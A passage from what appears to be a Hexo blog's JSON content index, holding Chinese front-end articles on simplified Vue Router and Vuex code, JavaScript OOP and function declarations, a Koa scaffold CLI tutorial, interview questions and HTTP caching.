&#125; &#125; VueRouter.install = function(Vue) &#123; // 混入所有组件 Vue.mixin(&#123; // 钩子函数 beforeCreate() &#123; // 仅在根组件执行一次 if (this.$options.router) &#123; Vue.prototype.$router = this.$options.router; this.$options.router.init(); &#125; &#125; &#125;); &#125;; Vue.use(VueRouter); export default new VueRouter(&#123; mode: &quot;history&quot;, base: process.env.BASE_URL, routes: [ &#123; path: &quot;/&quot;, name: &quot;Home&quot;, component: Home &#125; ] &#125;);","categories":[],"tags":[{"name":"源码","slug":"源码","permalink":"https://harrypangpang.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"vuex简单版学习","slug":"vuex简单实现","date":"2021-01-14T06:06:45.000Z","updated":"2023-02-23T03:30:13.097Z","comments":true,"path":"2021/01/14/vuex简单实现/","link":"","permalink":"https://harrypangpang.github.io/2021/01/14/vuex%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"vuex简单版学习 let Vue; class Store &#123; constructor(options) &#123; //实现data的双向绑定 this.state = new Vue(&#123; data: options.state &#125;); this.mutations = options.mutations; this.actions = options.actions; options.getters &amp;&amp; this.handleGetters(options.getters); &#125; commit = (type, arg) =&gt; &#123; this.mutations[type](this.state, arg); &#125;; dispatch(type, arg) &#123; this.actions[type]( &#123; state: this.state, commit: this.commit &#125;, arg ); &#125; handleGetters(getters) &#123; this.getters = &#123;&#125;; // 定义this.getters // 遍历getters选项，为this.getters定义property // 属性名就是选项中的key，只需定义get函数保证其只读性 Object.keys(getters).forEach(key =&gt; &#123; // 这样这些属性都是只读的 Object.defineProperty(this.getters, key, &#123; get: () =&gt; &#123; // 注意依然是箭头函数 return getters[key](this.state); &#125; &#125;); &#125;); &#125; &#125; function install(_Vue) &#123; Vue = _Vue; Vue.mixin(&#123; // 生命周期 beforeCreate() &#123; // 获取new Vue里的store Vue.prototype.$store = this.$options.store; &#125; &#125;); &#125; export default &#123; Store, install &#125;;","categories":[],"tags":[{"name":"源码","slug":"源码","permalink":"https://harrypangpang.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"是时候谈谈JavaScript面向对象了","slug":"是时候谈谈JavaScript面向对象了","date":"2019-05-14T08:05:19.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2019/05/14/是时候谈谈JavaScript面向对象了/","link":"","permalink":"https://harrypangpang.github.io/2019/05/14/%E6%98%AF%E6%97%B6%E5%80%99%E8%B0%88%E8%B0%88JavaScript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E4%BA%86/","excerpt":"","text":"前端技术尤其是JavaScript，经常被后端觉得不是正经编程语言，大多数是因为JavaScript是基于函数的语言，因此潜在上使得它在使用和发展上有所局限。 我记得在90年代末和21世纪初，JavaScript主要用于使html页面更加动态。比如实现一些弹窗，跑马灯之类的视觉效果。 现在，我们有很多框架，库，甚至后端系统都在使用JavaScript。用JavaScript开发一个移动应用和桌面应用程序-在以前是闻所未闻的，但如今，这些我们经常听说甚至已经投入使用了。现在我们还可以用JavaScript实现跨平台开发！ JavaScript无处不在，你可以使用JavaScript轻松完成很多有趣的东西。但随之而来的是潜在的长期问题。许多JavaScript开发者并没有像java开发者一样习惯使用面向对象编程，或者说没有面向对象编程这方面的训练。这很正常，因为我们经常为了追赶进度完成手头的工作，忽略了一些我们还不知道的内容 什么是面向对象编程？ 面向对象的编程是一种思想，一种心态。它背后的想法是，你为你想象中的对象创建了一个蓝图，然后一次又一次地调用它来完成各种各样的功能。每次你想使用一个对象时，你必须先创建它这样它才会存在，然后设置它的属性，以便使用附加到它的功能。这些功能被称为“方法”。 例如，一个CustomerOrder对象可能附加了一个GET：Order Details功能(又名方法)。 //基于类 class CustomerOrder&#123; constructor(customerId,orderId)&#123; this.customerId = customerId; this.orderId = orderId &#125; get orderDetails()&#123; return this.pullOrderDetails(); &#125; pullOrderDetails()&#123; //一些操作 return &#125; &#125; const order_1 = new CustomerOrder(87873,&quot;Cus-001&quot;) console.log(order_1.orderDetails) 我们来看另一个基于函数的方法： //基于函数 const customerId = 8787 const orderId = &quot;Cus-001&quot; function pullOrderDetails(customerId,orderId)&#123; //一些操作 return &#125; console.log(pullOrderDetails(87873,&quot;Cus-001&quot;)) 上面的问题在于，函数的数量多起来时，很快就会变得混乱。虽然将所有内容都编写为函数，然后根据需要来调用，在一开始可能会很方便，但是日积月累，函数之间的关联关系错综复杂，一旦发生变更，你可能需要修改很多函数，也会引起很多未知问题。 可能有些难理解，我们看下面的图（使用类的情况）： constructor是设置变量的地方，Getter和setter方法是类做事的入口。使用什么函数以及如何使用它们都是隐藏的。每次创建一个新对象时，整个类及其方法都会被“克隆”，并可访问需要的内容。发生变更时，我们也只需要在类上一次修改，便可以全局生效。 我们再看下面的图（使用函数的情况） 当我们用一堆松散的函数编写代码时，它的更改范围通常没有定义。依赖项注入是使函数正常工作所必需的，而一个函数常常需要另一个函数才能正常工作。从表面上看，基于函数的编程可能一开始看起来很简单，但从长远来看，维护它是一个逻辑上的噩梦。 使用面向对象编程，您只需要调用getter和setter方法来访问黑盒功能。作为类的消费者，你不需要知道它是如何工作的。你只需要知道它是有效的。 为什么我们要在JavaScript中采用面向对象编程 上面的两幅图能看出来，过度依赖基于函数的编程可能很快就能完成任务，但是长远来看，这会存在很高的风险。 随着代码量的增长，你就需要改变组织代码的思维方式，并考虑采用面向对象。与通过一系列依赖注入串在一起的函数相比，对象的则更容易追踪和掌握。 下面的代码是基于函数： 你会需要知道整个调用链，以便弄清楚如何实现你的目的。当然也很乱，不易理解。 基于函数的编程的问题是，链的中断可能导致整个流程的失败。对于对象，一个被破坏的方法不会(也不应该)影响类的其他部分。 下面的代码是基于类（面向对象）： 这种方法，可能代码量不会少多少，但你可以复用它，而不需要写很长的调用链。 当你思考问题时，是基于类，而不是一系列相互关联的函数时，代码自然会减少出现问题的风险。因为每一次依赖注入都会增加一次潜在错误的可能，而且寻找错误时，也会花费更多的时间和精力。、 最后 面向对象编程是一种主动的行为，你可以选择使用，也可以选择不使用。随着前端体系的日益庞大，代码量和应用场景也远超于从前，我们更需要思考面向对象编程的重要性。 面向对象编程的资料： https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object-oriented_JS ——————————————————————————————————————————————————— 放学别走！长按二维码关注 【技术人生路】，无偿免费获取前端学习进阶资料，培训实战视频，就业指导等众多福利哦。我相信我们都是爱学习爱进步的呀！","categories":[],"tags":[]},{"title":"函数声明？函数表达式？我该怎么选？！","slug":"函数声明VS函数表达式","date":"2019-05-10T06:48:36.000Z","updated":"2023-02-23T03:30:13.098Z","comments":true,"path":"2019/05/10/函数声明VS函数表达式/","link":"","permalink":"https://harrypangpang.github.io/2019/05/10/%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8EVS%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"我们在日常开发中经常使用函数，聪明的你肯定已经用的炉火纯青了。function doStuff（）&#123;&#125;和（）=&gt; &#123;&#125;是我们整天输入的字符。但它们有何不同，为什么使用另一个呢？ *注：我们这里用的例子都是JavaScript 第一个不同：名称 当你用一个名称创建函数时，这是一个函数声明。在函数表达式中可以省略该名称，使该函数“匿名”。 函数声明： function doStuff() &#123;&#125;; 函数函数表达式： const doStuff = function() &#123;&#125; 日常中我们经常使用ES6创建函数表达式 const doStuff = ()=&#123;&#125; 第二个不同：提升 提升是指函数和变量的提升，变量声明和函数声明提升至当前作用域的顶端，然后进行接下来的处理。 函数声明会被提升但函数表达式不会。 我们可以通过例子来加深理解： //函数声明 doStuff(); function doStuff() &#123; console.log(&#x27;haha&#x27;)&#125;; 结果： 看出来没有任何问题。 看下一个例子 //函数表达式 doStuff(); const doStuff = () =&gt; &#123;console.log(&#x27;haha&#x27;)&#125;; 看，这就报错了。 函数表达式实际解析的过程是这样的： const doStuff; doStuff(); doStuff = () =&gt; &#123;console.log(&#x27;haha&#x27;)&#125;; 注：函数声明提升的优先级比变量提升高。 使用函数表达式的情况： 通过上面两个例子，看起来函数声明在提升方面比函数表达式有用的多。但是在他们两个之间选择的时候应该如何抉择呢？ 调用函数表达式可以避免污染全局环境，因为你不知道你的程序有多少不同的函数，如果你使用函数表达式可能就会覆盖了别人的函数，采用函数表达式，就会避免这些问题。 立即执行函数（IIFE） IIFE - 立即调用函数表达式 - 就是字面意思。在创建函数后立即调用函数，使用IIFE，如下所示： (function() =&gt; &#123;&#125;)() //或者 (() =&gt; &#123;&#125;)() 回调（callback） 传递给另一个函数的函数通常在JavaScript中称为“回调”。，如下所示： function mapAction(item) &#123; // do stuff to an item &#125; array.map(mapAction) 这里的问题是mapAction可用于整个应用程序- 其实没有必要。如果该回调是一个函数表达式，它在函数外就不可用了： array.map(item =&gt; &#123; //do stuff to an item &#125;) //或者 const mapAction = function(item) &#123; // do stuff to an item &#125; array.map(mapAction) 虽然mapAction函数只有在他初始化之后才能使用 总结 简而言之，如果要在全局范围内创建函数并在整个代码中使用它，请使用函数声明。 使用函数表达式来限制函数的可用位置，保持全局环境的整洁干净。 ———————————————————————————————————————————————— 放学别走！长按二维码关注 【技术人生路】，无偿免费获取前端学习进阶资料，培训实战视频，就业指导等众多福利哦。我相信我们都是爱学习爱进步的呀！","categories":[],"tags":[]},{"title":"手把手教你实现脚手架工具Koa-generator","slug":"手把手教你实现脚手架工具Koa-generator","date":"2019-05-09T08:36:13.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2019/05/09/手把手教你实现脚手架工具Koa-generator/","link":"","permalink":"https://harrypangpang.github.io/2019/05/09/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%AE%9E%E7%8E%B0%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7Koa-generator/","excerpt":"","text":"我们日常中经常使用各种cli来加速我们的工作，你们也一定和我一样想知道这些cli内部都干了什么？接下来我们就以实现一个koa-generator来打开脚手架工具的大门，来跟着我一步一步做吧： 为了加快我们的学习进度，更快的理解cli，我们这里会省略一些内容，旨在帮助大家更快建立基本的概念和入门方法 需求分析 首先我们先对我们要实现的工具做一个简单的需求分析： 自动化生成koa初始项目结构 可以自定义一些内容 发布 是不是很简单？没错，真的很简单！ 逐步实现 1 想要自动化生成koa初始项目结构的前提，就是要知道我们构建出来的结构是什么样的： 上图就是我们想要生成的项目结构 明确了我们的目的接下来就开始着手吧！ 2 2.1 创建文件夹 mkdir koa-simple-generator 2.2 进入项目目录 cd koa-simple-generator 2.3 初始化npm（等不及实践就一路enter，后面也可以再做修改） npm init 2.4 打开我们的package.json，如下 将下面的代码复制到package.json里 &#123; &quot;name&quot;: &quot;koa-simple-generator&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;main&quot;: &quot;bin/wowKoa&quot;, &quot;bin&quot;: &#123; &quot;koa2&quot;: &quot;./bin/wowKoa&quot; &#125;, &quot;dependencies&quot;: &#123; &quot;commander&quot;: &quot;2.7.1&quot;, &quot;mkdirp&quot;: &quot;0.5.1&quot;, &quot;sorted-object&quot;: &quot;1.0.0&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;mocha&quot;: &quot;2.2.5&quot;, &quot;rimraf&quot;: &quot;~2.2.8&quot;, &quot;supertest&quot;: &quot;1.0.1&quot; &#125;, &quot;engines&quot;: &#123; &quot;node&quot;: &quot;&gt;= 7.0&quot; &#125; &#125; 1. dependencies和devDependencies简单来说就是应用的依赖包，devDependencies只会在开发环境安装 2. 这句话的意思是我们的这个工具需要node7.0及以上的版本才能支持 &quot;engines&quot;: &#123; &quot;node&quot;: &quot;&gt;= 7.0&quot; &#125; 重点是这两句 &quot;main&quot;: &quot;bin/wowKoa&quot;, &quot;bin&quot;: &#123; &quot;wowKoa&quot;: &quot;./bin/wowKoa&quot; &#125;, 意思是默认执行的是bin目录下的wowKoa， 执行wowKoa的命令，执行的也是bin目录下的wowKoa， ####2.5 接下来安装我们的依赖吧 npm i 2.6 安装完，我们新建一个目录template mkdir template 然后我们可以把我们想要生成的目录结构拷贝进去，这里我就只是把koa2的目录拷贝进去，现在我们的目录长这样： 2.7 新建bin目录，在bin下新建文件wowKoa 2.8 接下来就是关键了，我们的所有工作都是在bin下的wowKoa文件里完成的 直接复制粘贴下面的，然后进入项目目录运行node bin/wowKoa就能看到结果了 代码我已经大部分都注释啦 #!/usr/bin/env node // 告诉Unix和Linux系统这个文件中的代码用node可执行程序去运行 var program = require(&#x27;commander&#x27;); var mkdirp = require(&#x27;mkdirp&#x27;); var os = require(&#x27;os&#x27;); var fs = require(&#x27;fs&#x27;); var fsm = require(&#x27;fs-extra&#x27;) var path = require(&#x27;path&#x27;); var readline = require(&#x27;readline&#x27;); var pkg = require(&#x27;../package.json&#x27;); // 退出node进程 var _exit = process.exit; // s.EOL属性是一个常量，返回当前操作系统的换行符（Windows系统是\\r\\n，其他系统是\\n） var eol = os.EOL; var version = pkg.version; // Re-assign process.exit because of commander // TODO: Switch to a different command framework process.exit = exit program /** * .version(&#x27;0.0.1&#x27;, &#x27;-v, --version&#x27;) * 1版本号&lt;必须&gt;, * 2自定义标志&lt;可省略&gt;：默认为 -V 和 --version * * .option(&#x27;-n, --name&lt;path&gt;&#x27;, &#x27;name description&#x27;, &#x27;default name&#x27;) * 1 自定义标志&lt;必须&gt;：分为长短标识，中间用逗号、竖线或者空格分割；标志后面可跟必须参数或可选参数，前者用 &lt;&gt; 包含，后者用 [] 包含 * 2 选项描述&lt;省略不报错&gt;：在使用 --help 命令时显示标志描述 * 3 默认值&lt;可省略&gt; * * .usage(&#x27;[options] [dir]&#x27;) * 作用：只是打印用法说明 * * .parse(process.argv) * 作用：用于解析process.argv，设置options以及触发commands * process.argv获取命令行参数 * * * Commander提供了api来取消未定义的option自动报错机制， .allowUnknownOption() */ .version(version, &#x27;-v, --version&#x27;) .allowUnknownOption() .usage(&#x27;[options] [dir]&#x27;) .option(&#x27;-f, --force&#x27;, &#x27;force on non-empty directory&#x27;) .parse(process.argv); // 没有退出时执行主函数 if (!exit.exited) &#123; main(); &#125; /** * 主函数 */ function main() &#123; // 获取当前命令执行路径 var destinationPath = program.args.shift() || &#x27;.&#x27;; // 根据文件夹名称定义appname // 用于package.json里的name var appName = path.basename(path.resolve(destinationPath)); // 判断当前文件目录是否为空 emptyDirectory(destinationPath, function (empty) &#123; // 如果为空或者强制执行时，就直接生成项目 if (empty || program.force) &#123; createApplication(appName, destinationPath); &#125; else &#123; // 否则询问 confirm(&#x27;当前文件夹不为空，是否继续？[y/N] &#x27;, function (ok) &#123; if (ok) &#123; // 控制台不再输入时销毁 process.stdin.destroy(); createApplication(appName, destinationPath); &#125; else &#123; console.error(&#x27;aborting&#x27;); exit(1); &#125; &#125;); &#125; &#125;) &#125; /** * Check if the given directory `path` is empty. * 判断文件夹是否为空 * @param &#123;String&#125; path * @param &#123;Function&#125; fn */ function emptyDirectory(path, fn) &#123; fs.readdir(path, function (err, files) &#123; if (err &amp;&amp; &#x27;ENOENT&#x27; != err.code) throw err; fn(!files || !files.length); &#125;); &#125; /** * 在给定路径中创建应用 * @param &#123;String&#125; path */ function createApplication(app_name, path) &#123; // wait的值等于complete函数执行的次数 // 用于选择在哪一次complete函数执行后执行控制台打印引导使用的文案 var wait = 1; console.log(); function complete() &#123; if (--wait) return; var prompt = launchedFromCmd() ? &#x27;&gt;&#x27; : &#x27;$&#x27;; console.log(); console.log(&#x27; install dependencies:&#x27;); console.log(&#x27; %s cd %s &amp;&amp; npm install&#x27;, prompt, path); console.log(); console.log(&#x27; run the app:&#x27;); // 根据控制台的环境不同打印不同文案（linux或者win） if (launchedFromCmd()) &#123; console.log(&#x27; %s SET DEBUG=koa* &amp; npm start&#x27;, prompt, app_name); &#125; else &#123; console.log(&#x27; %s DEBUG=%s:* npm start&#x27;, prompt, app_name); &#125; &#125; copytmp(complete, path,app_name) &#125; // 拷贝模拟里的文件到本地 function copytmp(fn, destinationPath,app_name) &#123; // 获取模板文件的文件目录 tmpPath = path.join(__dirname, &#x27;..&#x27;, &#x27;template&#x27;) // 创建目录 fsm.ensureDir(destinationPath + &#x27;/&#x27;+app_name) .then(() =&gt; &#123; // 拷贝模板 fsm.copy(tmpPath, destinationPath + &#x27;/&#x27;+app_name, err =&gt; &#123; if (err) return console.log(err) fn() &#125;) &#125;) &#125; /** * Determine if launched from cmd.exe * 判断控制台环境（liux或者win获取其他） */ function launchedFromCmd() &#123; return process.platform === &#x27;win32&#x27; &amp;&amp; process.env._ === undefined; &#125; /** * node是使用process.stdin和process.stdout来实现标准输入和输出的 * readline 模块提供了一个接口，用于一次一行地读取可读流（例如 process.stdin）中的数据。 它可以使用以下方式访问： */ var rl = readline.createInterface(&#123; input: process.stdin, output: process.stdout &#125;); // 控制台问答 function confirm(msg, callback) &#123; rl.question(msg, function (input) &#123; callback(/^y|yes|ok|true$/i.test(input)); &#125;); &#125; // 控制台问答 function wrieQuestion(msg, callback) &#123; rl.question(msg, function (input) &#123; // rl.close()后就不再监听控制台输入了 rl.close(); callback(input) &#125;); &#125; /** * 通过fs读取模板文件内容 */ function loadTemplate(name) &#123; return fs.readFileSync(path.join(__dirname, &#x27;..&#x27;, &#x27;template&#x27;, name), &#x27;utf-8&#x27;); &#125; /** * echo str &gt; path. * 写入文件 * @param &#123;String&#125; path * @param &#123;String&#125; str */ function write(path, str, mode) &#123; fs.writeFileSync(path, str, &#123; mode: mode || 0666 &#125;); console.log(&#x27; \\x1b[36mcreate\\x1b[0m : &#x27; + path); &#125; /** * 这里是主要解决在winodws上的一些bug，不用卡在这里，核心目的就是为了能让进程优雅退出 * Graceful exit for async STDIO */ function exit(code) &#123; // flush output for Node.js Windows pipe bug // https://github.com/joyent/node/issues/6247 is just one bug example // https://github.com/visionmedia/mocha/issues/333 has a good discussion function done() &#123; if (!(draining--)) _exit(code); &#125; var draining = 0; var streams = [process.stdout, process.stderr]; exit.exited = true; streams.forEach(function (stream) &#123; // submit empty write request and wait for completion draining += 1; stream.write(&#x27;&#x27;, done); &#125;); done(); &#125;","categories":[],"tags":[]},{"title":"10个前端面试必会题目！（适用于中高级）","slug":"10个前端面试必会题","date":"2019-05-07T09:04:14.000Z","updated":"2023-02-23T03:30:13.095Z","comments":true,"path":"2019/05/07/10个前端面试必会题/","link":"","permalink":"https://harrypangpang.github.io/2019/05/07/10%E4%B8%AA%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%BF%85%E4%BC%9A%E9%A2%98/","excerpt":"","text":"现在大部分公司的管理者都会通过技术面试来考察开发者的能力。如果你成为了候选人，那你一定需要去经历面试。 大部分的面试相信大家一定经历过，但是其实我们不应该过度关注于语法和一些怪异生僻的特性中。诚然这些能考察到候选人的基础功扎实与否，但我们应该更多的是从全局来考虑，询问架构和范例（这方面决定会对整个项目有重大的影响）。 语法和特性其实都能在谷歌中找到。但是软件工程师的智慧和JS开发者在经验中获得的通用范例和用法是无法从谷歌中获得的。 Javascript是特殊的，他现在几乎在所有大型应用中都扮演中重要的角色。那你又知道JS和其他的语言有什么不同之处吗？ 接下来的几个问题会帮助你探索真正需要关注的内容： 1. 你能说出两个在Javascript中很重要的编程范式吗？ Javascript是多范式语言：命令式/过程式，函数式，面向对象。Javascript支持通过原型继承实现面向对象编程 优秀回答： 原型继承（或者原型） 函数式编程（闭包，一等函数，lambda演算，箭头函数） 红色预警： -不知道范式是什么，也没有提及原型面向对象或者函数式编程 参考： https://www.cnblogs.com/sirkevin/p/8283110.html https://www.cnblogs.com/nunn/p/3460175.html 2.什么是函数式编程 函数式编程，可以归结为面向过程的程序设计，但是结合了更多的数学计算的思想。函数式编程就是一种抽象程度很高的编程范式，纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。而允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。 函数式编程是JavaScript中的一个基本概念（JavaScript两大支柱之一（原型继承和函数式编程）） 优秀回答： 纯函数 避免副作用 简单的函数功能组合 函数语言的例子：Lisp，ML，Haskell，Erlang，Clojure，Elm，F Sharp，OCaml等… 提到函数式编程的功能：一等函数，高阶函数，函数作为参数/值 红色预警： 没有提到纯函数，或者避免副作用 无法提供函数式编程语言的示例 无法识别启用函数式编程的JavaScript功能 3.类继承和原型继承有什么区别 类继承： JavaScript本来是没有类继承的，我们可以通过关键词new来将构造函数实例化，call和apply方法为类式继承提供了支持。通过改变this的作用环境，使得子类本身具有父类的各种属性。当然，我们现在拥有了ES6的calss，也可以使用calss来实现类继承。 原型继承： 实例直接从其他对象继承。实例通常通过工厂函数或“Object.create()”实例化。实例可以由许多不同的对象组成，从而可以方便地选择继承。 在JavaScript中，原型继承比类继承更简单、更灵活。 优秀回答： 类继承：紧密耦合或基于层级的分类 原型继承：提到了原型委托，功能继承，对象组合。 红色预警： 不依赖于原型继承和而类继承的组合 4.函数式编程与面向对象编程的优缺点是什么？ 面向对象编程的优点： 很容易理解对象的基本概念，也很容易解释调用方法的含义。面向对象编程更倾向于命令式而不是声明式，声明式读起来就像是给计算机遵循的直接命令 面向对象编程的缺点： 面向对象编程通常依赖于共享状态。对象和行为通常连接在同一个实体上，该实体可以被任意数量的顺序不确定的函数随机访问，这可能导致不需要的行为，如竞争条件。 函数式编程的优点： 使用函数式编程，程序员可以避免任何共享状态或副作用，从而消除由于多个函数争夺相同资源而导致的错误。与面向对象编程相比，函数式编程从根本上简化，并易于重新组合，以获得更普遍可重用的代码。 函数式编程倾向于声明式和外延式，它们不详细说明操作的一步一步的指令，而是专注于做什么，让底层函数来处理如何做。这为重构和性能优化留下了巨大的空间，甚至允许你用更高效的算法替换整个算法，而只需很少的代码更改。 使用纯函数进行计算，也容易跨多个处理器或跨分布式计算集群扩展，而无需担心线程资源冲突、竞争条件等问题。 函数式编程的缺点： 过度使用函数式编程特性(如大型组合)可能会降低可读性，因为生成的代码通常更抽象、更简洁、更不具体。 与函数式编程相比，更多人熟悉面向对象编程和命令式编程，因此即使是函数式编程中的常见习惯用法也可能让新团队成员感到困惑。 函数式编程的学习曲线要比面向对象编程陡峭得多，因为面向对象编程的广泛流行使面向对象编程的语言和学习材料变得更加语义化，而函数式编程的语言则趋向于更加学术化和形式化。函数式编程概念经常涉及到使用lambda演算、代数和范畴理论中的习惯用法和符号，所有这些都需要去了解这些领域的知识。 优秀回答： 提到共享状态的问题，竞争相同资源的不同事物等等… 意识到函数式编程能够从根本上简化许多应用程序。 意识到学习曲线的差异。 阐明副作用以及它们如何影响程序的可维护性。 意识到功能强大的代码库可能具有陡峭的学习曲线。 意识到与同等的函数式编程代码库相比，过多的OOP代码会非常难以应对变化并且非常脆弱。 红色预警： 无法列出一种风格或另一种风格的缺点 - 任何一种风格都有其不足。 5. 什么时候适合选择类继承？ 答案是啥时候都不适合，多层次的类结构是反模式。 优秀回答： 很少，几乎从来没有，或从未 单级别的时候有时候是可以的，比如React.Component 对象继承比类继承更好 6. 什么时候适合原型继承？ 原型继承有多种类型： 原型链 mixins，Object.assign() 函数式（别和函数式编程混淆，这里是创建闭包函数实现私有状态/封装） 每种类型的原型继承都有自己的创建方法，但是它们合成对象的能力都一样，它创建了has-a或uses-a或can-do关系，而不是类继承创建的is-a的关系。 优秀回答： 在模块或函数编程没有提供明显解决方案的情况下 当需要从多个地方组合对象时 任何需要继承的地方 红色预警： 不知道何时使用原型。 没有意识到mixins或Object.assign（） 7. 对象继承比类继承更好是为什么 代码重用应该通过将较小的功能单元组装到新对象中来实现，而不是继承类并创建对象分类法。 换句话说，使用can-do，has-a或使用关系而不是is-a关系。 优秀回答： 避免使用类层次结构 避免脆弱的类问题 避免紧密耦合 避免严格的分类（强制is-a关系对于新的代码使用是不友好的） 避免大猩猩香蕉问题（“你想要的是香蕉，你得到的是拿着香蕉的大猩猩，以及整个丛林”） 使代码更灵活 红色预警： 上面的一个都不知道 8. 什么是双向数据绑定和单向数据流，它们有何不同？ 双向数据绑定意味着View层数据变化，Model层的数据也会相应变化，反之亦然。 单向数据流意味着Model层数据变化会引起View层数据变化，但View层数据变化无法引起Model层的数据变化，数据总是朝着一个方向流动（就像React里的store）。这使得理解起来更容易。 单向数据流具有是确定性的，而双向绑定可能导致更难以遵循和理解的副作用。 优秀回答： React是单向数据流的范例，因此提及React是一个很好的信号。 Cycle.js是单向数据流的另一种流行实现。 Angular/Vue是一种使用双向绑定的流行框架。 红色预警： 不了解任何一个意味着什么，无法阐明差异。 9.单体架构与微服务架构的优缺点是什么？ 所谓的单体架构就是把所有的业务模块编写在一个项目中，最终会打包成一个war包，然后进行部署 微服务架构意味着应用程序由许多较小的独立应用程序组成，这些应用程序能够在自己的内存空间中运行，并且可能在许多不同的机器上相互独立地进行扩展和协作。 单体架构优点： 单片架构的主要优点是大多数应用程序可以共用很多东西，例如日志记录，速率限制以及审计跟踪和DOS保护等安全功能。 还有性能优势，因为共享内存访问比进程间通信（IPC）更快。 单体架构缺点： 随着应用程序的发展，应用程序服务往往会紧密耦合和纠缠，从而难以将服务隔离并独立扩展出来，并且实现代码可维护性等。 单体架构也很难理解，因为当你查看特定服务或控制器时，可能存在依赖性，副作用等不明显的隐形问题 它们还可以根据组织方式获得性能优势，因为可以独立于应用程序的其他部分，与核心服务隔离并对其进行伸缩。 微服务架构优点 微服务体系结构通常组织得更好，因为每个微服务都有一个非常特定的任务，并且不关心其他组件的任务。解耦的服务也更容易重新组合和配置，以满足不同应用程序的需要(例如，同时服务于web客户机和公共API)。 微服务架构缺点 微服务部署在虚拟机或容器上，导致VM争用工作激增。 运维复杂度提供 优秀回答： 微服务架构一开始成本较高，但微服务从长远来看往往会表现更好并且规模更大。 关于微服务和单片应用程序的实用性。两者在不同情况下的使用选择 红色预警： 不了解单体架构和微服务架构之间的差异。 对微服务的额外开销没有意识到。 不知道IPC和网络通信对微服务造成的额外性能开销。 无法明确解决单片应用程序的分离方式，以便在时机成熟时将它们轻松拆分为微服务。 低估了独立可扩展微服务的优势。 10. 什么是异步编程，为什么它在JavaScript中很重要？ 同步编程意味着，除了条件和函数调用之外，代码从上到下依次执行，阻塞长时间运行的任务，如网络请求和磁盘I / O等。 异步编程意味着引擎在一个事件循环中运行。当需要阻塞操作时，将启动请求，并且代码将继续运行，而不会阻塞结果。当响应就绪时，将触发一个中断，这时运行一个事件处理程序，其中控制流将继续运行。通过这种方式，一个程序线程可以处理许多并发操作。 用户界面本质上是异步的，并且花费大部分时间等待用户输入来中断事件循环并触发事件处理程序。 默认情况下，Node是异步的，这意味着服务器的工作方式大致相同，在循环中等待网络请求，并在处理第一个请求时接受更多的传入请求。 这在JavaScript中很重要，因为它非常适合UI代码，并且非常有利于服务器上的性能。 优秀回答： 了解阻塞意味着什么，以及性能影响。 了解事件处理，以及为什么它对UI代码很重要。 红色预警： 不熟悉异步或同步的术语。 无法阐明性能影响或异步代码与UI代码之间的关系。","categories":[],"tags":[]},{"title":"强制缓存（200）和协商缓存（304）","slug":"强制缓存（200）和协商缓存（304）","date":"2019-05-06T09:09:18.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2019/05/06/强制缓存（200）和协商缓存（304）/","link":"","permalink":"https://harrypangpang.github.io/2019/05/06/%E5%BC%BA%E5%88%B6%E7%BC%93%E5%AD%98%EF%BC%88200%EF%BC%89%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%EF%BC%88304%EF%BC%89/","excerpt":"","text":"本文将介绍强制缓存（200）和协商缓存（304）的区别 1. 什么是缓存？ 浏览器缓存(Brower Caching)是浏览器对之前请求过的文件进行缓存，以便下一次访问时重复使用，节省带宽，提高访问速度，降低服务器压力 http缓存机制主要在http响应头中设定，响应头中相关字段为Expires、Cache-Control、Last-Modified、If-Modified-Since、Etag。 HTTP 1.0协议中的。简而言之，就是告诉浏览器在约定的这个时间前，可以直接从缓存中获取资源（representations），而无需跑到服务器去获取。 另：Expires因为是对时间设定的，且时间是Greenwich Mean Time （GMT），而不是本地时间，所以对时间要求较高。 2. 浏览器是如何判断是否使用缓存的 第一次请求： 第二次请求相同网页： 3. 缓存的类别 浏览器缓存分为强缓存和协商缓存 强缓存：浏览器不会像服务器发送任何请求，直接从本地缓存中读取文件并返回Status Code: 200 OK 200 form memory cache : 不访问服务器，一般已经加载过该资源且缓存在了内存当中，直接从内存中读取缓存。浏览器关闭后，数据将不存在（资源被释放掉了），再次打开相同的页面时，不会出现from memory cache。 200 from disk cache： 不访问服务器，已经在之前的某个时间加载过该资源，直接从硬盘中读取缓存，关闭浏览器后，数据依然存在，此资源不会随着该页面的关闭而释放掉下次打开仍然会是from disk cache。 优先访问memory cache,其次是disk cache，最后是请求网络资源 协商缓存: 向服务器发送请求，服务器会根据这个请求的request header的一些参数来判断是否命中协商缓存，如果命中，则返回304状态码并带上新的response header通知浏览器从缓存中读取资源； 4. 强缓存和协商缓存的header参数 强缓存： Expires：过期时间，如果设置了时间，则浏览器会在设置的时间内直接读取缓存，不再请求 Cache-Control：当值设为max-age=300时，则代表在这个请求正确返回时间（浏览器也会记录下来）的5分钟内再次加载资源，就会命中强缓存。 cache-control：除了该字段外，还有下面几个比较常用的设置值： （1） max-age：用来设置资源（representations）可以被缓存多长时间，单位为秒； （2） s-maxage：和max-age是一样的，不过它只针对代理服务器缓存而言； （3）public：指示响应可被任何缓存区缓存； 